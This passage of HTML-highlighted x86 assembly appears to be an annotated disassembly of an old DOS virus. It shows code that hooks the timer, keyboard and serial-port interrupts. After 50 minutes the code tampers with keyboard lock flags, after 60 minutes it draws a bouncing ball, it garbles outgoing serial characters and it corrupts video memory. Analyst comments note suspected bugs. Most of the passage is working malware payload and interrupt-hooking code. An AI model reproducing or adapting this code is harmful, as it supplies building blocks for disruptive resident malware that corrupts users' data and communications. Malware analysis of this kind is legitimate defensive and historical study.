        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0026H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW9</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0024H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Hook interrupt 8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0020H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD8</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0022H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD8</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0022H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0020H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">        </span><span class="sc5">EXIT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Video processing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VID</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIDEOT</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIDEOT</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIDEOT</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">
        </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">V1</span><span class="sc0">
</span><span class="sc5">V0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">V0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">V2</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">V1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">V1</span><span class="sc0">
</span><span class="sc5">V2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       INT 9 replacement: Just fiddle around with the NUM-LOCK etc.</span><span class="sc0">
</span><span class="sc1">;       This routine does not become active until 50 minutes after</span><span class="sc0">
</span><span class="sc1">;       the execution of an infected program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW9</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN50</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">RETX1</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                           </span><span class="sc1">; was xxxxxxxx</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">417H</span><span class="sc4">],</span><span class="sc2">0BFH</span><span class="sc0">         </span><span class="sc1">;     x0xxxxxx</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">417H</span><span class="sc4">],</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">;     x01xxxxx</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">417H</span><span class="sc4">],</span><span class="sc2">0CH</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">RETX1</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">RETX1</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">417H</span><span class="sc4">],</span><span class="sc2">0F7H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This seems to be an error - the virus uses a FAR call, which will</span><span class="sc0">
</span><span class="sc1">;       probably cause the computer to crash.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9AH</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VID</span><span class="sc4">,</span><span class="sc2">171CH</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This needs more checking.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
 
</span><span class="sc5">RETX1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD9</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       New INT 14 routine - garble all outgoing characters</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW14</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">S1</span><span class="sc0">
</span><span class="sc5">DO14</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD14</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">S1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ERRTAB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; use old character as index into table</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">DO14</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       New INT 8 routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN60</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">          </span><span class="sc1">; If counter &gt;= 60 min.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">TT0</span><span class="sc0">                             </span><span class="sc1">; No need to check any more</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TIMER</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; else increment timer</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TIMER</span><span class="sc4">],-</span><span class="sc2">10</span><span class="sc0">         </span><span class="sc1">; 60 minutes ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">TT1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TIMER</span><span class="sc4">],</span><span class="sc2">54600</span><span class="sc0">       </span><span class="sc1">; 50 minutes ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">TT2</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">TXEX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       50 minutes after an infected program is run the flag is set.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TT2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN50</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">TXEX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       60 minutes after an infected program is run we start the ball bouncing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TT1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN60</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Get current cursor position and save it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRLINE</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRCOL</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set cursor position</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Check what is there and store it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ONSCREEN</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set cursor position back as it was before</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Get current video mode and store it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">VMODE</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Exit interrupt routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">TXEX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Every time an INT 8 occurs, after the 60 min. have passed, we</span><span class="sc0">
</span><span class="sc1">;       end up here:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       First get current cursor position</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TT0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRLINE</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRCOL</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Then set it to last position of ball.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Write previous character there ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ONSCREEN</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">UPDOWN</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">T2</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">T3</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">T2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">T3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">LEFTRIGHT</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">T4</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">T5</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">T4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Get current video mode</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">VMODE</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MAXLIN</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; bottom of screen ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">T6</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Reached bottom - now go upwards.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">UPDOWN</span><span class="sc4">]</span><span class="sc0">
